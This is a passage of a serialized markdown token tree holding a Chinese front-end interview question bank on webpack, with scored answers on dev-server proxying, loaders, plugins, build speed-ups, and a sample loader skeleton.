在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。","text":" 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。","text":"在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"strong","raw":"**注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。**","text":"注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。","tokens":[{"type":"text","raw":"注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。","text":"注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack的loader是什么？为什么使用它？它有哪几种配置方式\\n\\n","depth":2,"text":"webpack的loader是什么？为什么使用它？它有哪几种配置方式","tokens":[{"type":"text","raw":"webpack的loader是什么？为什么使用它？它有哪几种配置方式","text":"webpack的loader是什么？为什么使用它？它有哪几种配置方式","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件\\n- **1：** webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。  \\n在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。\\n- **3：** 关于配置 loader 的方式有三种:\\n  >配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n  >内联方式：在每个 import 语句中显式指定 loader  \\n  >Cl 方式：在 shell 命令中指定它们","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件\\n","task":false,"loose":false,"text":"**1：** loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件","tokens":[{"type":"text","raw":"**1：** loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件","text":"**1：** loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件","text":" loader 用于对模块的\\"源代码\\"进行转换，在 import 或\\"加载\\"模块时预处理文件","escaped":false}]}]},{"type":"list_item","raw":"- **1：** webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。  \\n在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。\\n","task":false,"loose":false,"text":"**1：** webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。  \\n在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。","tokens":[{"type":"text","raw":"**1：** webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。  \\n\\n在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。","text":"**1：** webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。  \\n在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。","text":" webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。","text":"在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。","escaped":false}]}]},{"type":"list_item","raw":"- **3：** 关于配置 loader 的方式有三种:\\n  >配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n  >内联方式：在每个 import 语句中显式指定 loader  \\n  >Cl 方式：在 shell 命令中指定它们","task":false,"loose":false,"text":"**3：** 关于配置 loader 的方式有三种:\\n>配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n>内联方式：在每个 import 语句中显式指定 loader  \\n>Cl 方式：在 shell 命令中指定它们","tokens":[{"type":"text","raw":"**3：** 关于配置 loader 的方式有三种:\\n","text":"**3：** 关于配置 loader 的方式有三种:","tokens":[{"type":"strong","raw":"**3：**","text":"3：","tokens":[{"type":"text","raw":"3：","text":"3：","escaped":false}]},{"type":"text","raw":" 关于配置 loader 的方式有三种:","text":" 关于配置 loader 的方式有三种:","escaped":false}]},{"type":"blockquote","raw":">配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n>内联方式：在每个 import 语句中显式指定 loader  \\n>Cl 方式：在 shell 命令中指定它们","tokens":[{"type":"paragraph","raw":"配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n内联方式：在每个 import 语句中显式指定 loader  \\nCl 方式：在 shell 命令中指定它们","text":"配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n内联方式：在每个 import 语句中显式指定 loader  \\nCl 方式：在 shell 命令中指定它们","tokens":[{"type":"text","raw":"配置方式(推荐)：在 webpack.config.js文件中指定 loader","text":"配置方式(推荐)：在 webpack.config.js文件中指定 loader","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"内联方式：在每个 import 语句中显式指定 loader","text":"内联方式：在每个 import 语句中显式指定 loader","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"Cl 方式：在 shell 命令中指定它们","text":"Cl 方式：在 shell 命令中指定它们","escaped":false}]}],"text":"配置方式(推荐)：在 webpack.config.js文件中指定 loader  \\n内联方式：在每个 import 语句中显式指定 loader  \\nCl 方式：在 shell 命令中指定它们"}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"heading","raw":"## webpack的Plugin是什么\\n\\n","depth":2,"text":"webpack的Plugin是什么","tokens":[{"type":"text","raw":"webpack的Plugin是什么","text":"webpack的Plugin是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","task":false,"loose":false,"text":"**2：** webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","tokens":[{"type":"text","raw":"**2：** webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","text":"**2：** webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","text":" webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack的Plugin和Loader的区别\\n\\n","depth":2,"text":"webpack的Plugin和Loader的区别","tokens":[{"type":"text","raw":"webpack的Plugin和Loader的区别","text":"webpack的Plugin和Loader的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：**【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。\\n- **1：**【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。\\n","task":false,"loose":false,"text":"**1：**【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。","tokens":[{"type":"text","raw":"**1：**【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。","text":"**1：**【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。","text":"【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","task":false,"loose":false,"text":"**1：**【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","tokens":[{"type":"text","raw":"**1：**【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","text":"**1：**【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","text":"【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack常见的提升构建速度的方法\\n\\n","depth":2,"text":"webpack常见的提升构建速度的方法","tokens":[{"type":"text","raw":"webpack常见的提升构建速度的方法","text":"webpack常见的提升构建速度的方法","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 常见的有一下几种：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 常见的有一下几种：","task":false,"loose":false,"text":"**2：** 常见的有一下几种：","tokens":[{"type":"text","raw":"**2：** 常见的有一下几种：","text":"**2：** 常见的有一下几种：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 常见的有一下几种：","text":" 常见的有一下几种：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":" >优化 loader 配置  \\n >合理使用 resolve.extensions  \\n >优化 resolve.modules  \\n >优化 resolve.alias  \\n >使用 DLLPlugin 插件  \\n >使用 cache-loader  \\n >terser 启动多线程  \\n >合理使用 sourceMap","tokens":[{"type":"paragraph","raw":"优化 loader 配置  \\n合理使用 resolve.extensions  \\n优化 resolve.modules  \\n优化 resolve.alias  \\n使用 DLLPlugin 插件  \\n使用 cache-loader  \\nterser 启动多线程  \\n合理使用 sourceMap","text":"优化 loader 配置  \\n合理使用 resolve.extensions  \\n优化 resolve.modules  \\n优化 resolve.alias  \\n使用 DLLPlugin 插件  \\n使用 cache-loader  \\nterser 启动多线程  \\n合理使用 sourceMap","tokens":[{"type":"text","raw":"优化 loader 配置","text":"优化 loader 配置","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"合理使用 resolve.extensions","text":"合理使用 resolve.extensions","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"优化 resolve.modules","text":"优化 resolve.modules","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"优化 resolve.alias","text":"优化 resolve.alias","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"使用 DLLPlugin 插件","text":"使用 DLLPlugin 插件","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"使用 cache-loader","text":"使用 cache-loader","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"terser 启动多线程","text":"terser 启动多线程","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"合理使用 sourceMap","text":"合理使用 sourceMap","escaped":false}]}],"text":"优化 loader 配置  \\n合理使用 resolve.extensions  \\n优化 resolve.modules  \\n优化 resolve.alias  \\n使用 DLLPlugin 插件  \\n使用 cache-loader  \\nterser 启动多线程  \\n合理使用 sourceMap"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack中的Loader如何编写？\\n\\n","depth":2,"text":"webpack中的Loader如何编写？","tokens":[{"type":"text","raw":"webpack中的Loader如何编写？","text":"webpack中的Loader如何编写？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **5：** loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **5：** loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","task":false,"loose":false,"text":"**5：** loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","tokens":[{"type":"text","raw":"**5：** loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","text":"**5：** loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","tokens":[{"type":"strong","raw":"**5：**","text":"5：","tokens":[{"type":"text","raw":"5：","text":"5：","escaped":false}]},{"type":"text","raw":" loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","text":" loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\n//导出一个函数，source为webpack传递给loader的文件源内容\\nmodule.exports = function(source){\\n const content = doSomeThing2JsString(source);\\n//如果 loader 配置了 options 对象，那么this.query将指向 options\\nconst options = this.query;\\n// 可以用作解析其他模块路径的上下文\\nconsole.log(\'this.context\');\\n/*\\n* this.callback 参数:\\n* error:Error |null，当 loader 出错时向外抛出一个 error\\n* content:String | Buffer，经过 loader 编译后需要导出的内容\\n* sourceMap:为方便调试生成的编译后内容的 source map* ast:本次编译生成的 AST 静态语法树，之后执行的 loader 可以直接使用这个 AST.进而省去重复生成 AST 的过程\\n*/\\nthis.callback(null，content);//异步\\nreturn content;//同步\\n}\\n```","lang":"javascript","text":"//导出一个函数，source为webpack传递给loader的文件源内容\\nmodule.exports = function(source){\\n const content = doSomeThing2JsString(source);\\n//如果 loader 配置了 options 对象，那么this.query将指向 options\\nconst options = this.query;\\n// 可以用作解析其他模块路径的上下文\\nconsole.log(\'this.context\');\\n/*\\n* this.callback 参数:\\n* error:Error |null，当 loader 出错时向外抛出一个 error\\n* content:String | Buffer，经过 loader 编译后需要导出的内容\\n* sourceMap:为方便调试生成的编译后内容的 source map* ast:本次编译生成的 AST 静态语法树，之后执行的 loader 可以直接使用这个 AST.进而省去重复生成 AST 的过程\\n*/\\nthis.callback(null，content);//异步\\nreturn content;//同步\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack中的Plugin如何编写？\\n\\n","depth":2,"text":"webpack中的Plugin如何编写？","tokens":[{"type":"text","raw":"webpack中的Plugin如何编写？","text":"webpack中的Plugin如何编写？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **5：** 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务  \\nwebpack 编译会创建两个核心对象:\\n- compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子\\n- compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation  \\n将被创建如果自己要实现 plugin ，也需要遵循一定的规范:\\n- 插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.\\n- 传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改\\n- 异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **5：** 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务  \\nwebpack 编译会创建两个核心对象:\\n","task":false,"loose":false,"text":"**5：** 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务  \\nwebpack 编译会创建两个核心对象:","tokens":[{"type":"text","raw":"**5：** 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务  \\n\\nwebpack 编译会创建两个核心对象:","text":"**5：** 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务  \\nwebpack 